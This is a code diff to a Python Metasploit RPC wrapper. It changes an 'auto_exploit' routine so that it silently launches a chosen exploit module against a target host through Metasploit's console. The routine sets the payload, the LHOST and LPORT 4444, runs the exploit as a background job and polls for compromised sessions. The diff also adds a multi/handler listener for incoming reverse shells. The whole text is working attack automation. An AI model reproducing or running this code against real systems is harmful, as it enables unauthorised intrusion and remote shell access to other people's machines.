@@ -129,7 +129,7 @@ class MetasploitRPCEngine:
             return False
 
     def auto_exploit(self):
-        """Silently configures and launches an exploit via API."""
+        """Silently configures and launches an exploit via Virtual Console API."""
         default_rhost = ctx.get("RHOST") or "192.168.1.1"
         default_lhost = ctx.get("LHOST") or "127.0.0.1"
 
@@ -195,44 +195,39 @@ class MetasploitRPCEngine:
             return
 
         console.print(Panel(
-            f"[bold cyan]Deploying Exploit via API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
+            f"[bold cyan]Deploying Exploit via Virtual Console API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
 
         try:
-            exploit = self.client.modules.use('exploit', custom_mod)
+            # We use the Virtual Console API to bypass module parsing bugs.
+            # This is exactly like typing the commands into msfconsole natively.
+            msf_console = self.client.consoles.console()
 
-            # Apply options securely checking if the module requires them
-            if 'RHOSTS' in exploit.options:
-                exploit['RHOSTS'] = target
-            elif 'RHOST' in exploit.options:
-                exploit['RHOST'] = target
+            msf_console.write(f"use {custom_mod}\n")
+            msf_console.write(f"set RHOSTS {target}\n")
+            # Fallback for older modules
+            msf_console.write(f"set RHOST {target}\n")
+            msf_console.write(f"set RPORT {rport}\n")
+            msf_console.write(f"set PAYLOAD {custom_payload}\n")
+            msf_console.write(f"set LHOST {lhost}\n")
+            msf_console.write(f"set LPORT 4444\n")
+            msf_console.write("exploit -j\n")  # -j runs it as a background job
 
-            if 'RPORT' in exploit.options:
-                exploit['RPORT'] = rport
+            db.log("MSF-Engine", target,
+                   f"Attempted {custom_mod} via Console", "INFO")
 
-            # Do not force RunAsJob; let MSF decide natively so command shells hook properly.
-            payload_opts = {
-                'LHOST': lhost,
-                'LPORT': 4444
-            }
+            # Capture the native MSF output so the user sees errors (like missing options)
+            console_output = ""
+            with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
+                for _ in range(3):
+                    time.sleep(1.5)
+                    out = msf_console.read()
+                    if out and out.get('data'):
+                        console_output += out['data']
 
-            job = exploit.execute(payload=custom_payload, **payload_opts)
+            if console_output.strip():
+                console.print(f"\n[dim]{console_output.strip()}[/dim]")
 
-            # SAFE TYPE CHECK
-            if isinstance(job, dict) and job.get('job_id') is not None:
-                console.print(
-                    f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
-                db.log("MSF-Engine", target,
-                       f"Launched {custom_mod} via RPC", "HIGH")
-            elif isinstance(job, dict) and job.get('uuid'):
-                console.print(
-                    f"[bold green][+] Exploit executed successfully (Foreground).[/bold green]")
-                db.log("MSF-Engine", target,
-                       f"Launched {custom_mod} via RPC", "HIGH")
-            else:
-                console.print(
-                    f"[yellow][+] Exploit executed, response: {job}[/yellow]")
-
-            # Smart Wait Loop for Session Hooking (Polls every 2 seconds for 10 seconds)
+            # Smart Wait Loop for Session Hooking
             with console.status("[bold cyan]Waiting for session to establish...[/bold cyan]", spinner="bouncingBar"):
                 session_found = False
                 for _ in range(5):
@@ -241,12 +236,14 @@ class MetasploitRPCEngine:
                     if sessions:
                         console.print(
                             f"\n[bold green][+] Success! {len(sessions)} session(s) active. Use Option 3 to interact.[/bold green]")
+                        db.log("MSF-Engine", target,
+                               f"Successful Exploit: {custom_mod}", "CRITICAL")
                         session_found = True
                         break
 
                 if not session_found:
                     console.print(
-                        "\n[yellow][-] No session established yet. The target might not be vulnerable, or it needs more time.[/yellow]")
+                        "\n[yellow][-] No session established yet. The exploit may have failed, the target isn't vulnerable, or it needs more time.[/yellow]")
 
         except Exception as e:
             console.print(
@@ -409,18 +406,23 @@ class MetasploitRPCEngine:
                         continue
 
                     try:
-                        exploit = self.client.modules.use(
-                            'exploit', 'multi/handler')
-                        job = exploit.execute(
-                            payload=payload, LHOST=lhost, LPORT=int(lport))
+                        # Upgraded Listener to also use Virtual Console API for stability
+                        msf_console = self.client.consoles.console()
+                        msf_console.write("use exploit/multi/handler\n")
+                        msf_console.write(f"set PAYLOAD {payload}\n")
+                        msf_console.write(f"set LHOST {lhost}\n")
+                        msf_console.write(f"set LPORT {lport}\n")
+                        msf_console.write("exploit -j\n")
 
-                        # SAFE TYPE CHECK
-                        if isinstance(job, dict) and job.get('job_id') is not None:
+                        console.print(
+                            "[bold green][+] Listener started in background.[/bold green]")
+
+                        time.sleep(2)
+                        output = msf_console.read()
+                        if output and output.get('data'):
                             console.print(
-                                f"[bold green][+] Listener started in background (Job ID: {job['job_id']})[/bold green]")
-                        else:
-                            console.print(
-                                f"[yellow][+] Listener launched, response: {job}[/yellow]")
+                                f"\n[dim]{output['data'].strip()}[/dim]")
+
                     except Exception as e:
                         console.print(
                             f"[red][!] Failed to start listener: {e}[/red]")
